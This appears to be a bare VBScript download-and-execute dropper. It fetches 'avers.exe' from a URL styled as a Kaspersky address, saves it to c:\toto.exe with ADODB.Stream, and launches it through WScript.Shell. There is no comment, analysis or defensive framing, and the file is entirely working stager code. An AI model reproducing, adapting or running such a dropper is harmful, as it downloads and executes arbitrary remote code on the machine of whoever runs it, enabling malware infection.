Dim HTTPGET
Set HTTPGET = CreateObject("Microsoft.XMLHTTP")
HTTPGET.Open "GET", "http://www.kaspersky.com/avers.exe", false
HTTPGET.Send
DataBin = HTTPGET.ResponseBody
Const adTypeBinary=1
Const adSaveCreateOverWrite=2
Dim SendBinary
Set SendBinary = CreateObject("ADODB.Stream")
SendBinary.Type = adTypeBinary
SendBinary.Open
SendBinary.Write DataBin
SendBinary.SaveToFile "c:\toto.exe", adSaveCreateOverWrite
Set hShell=CreateObject("WScript.Shell") : hShell.run("c:\toto.exe")
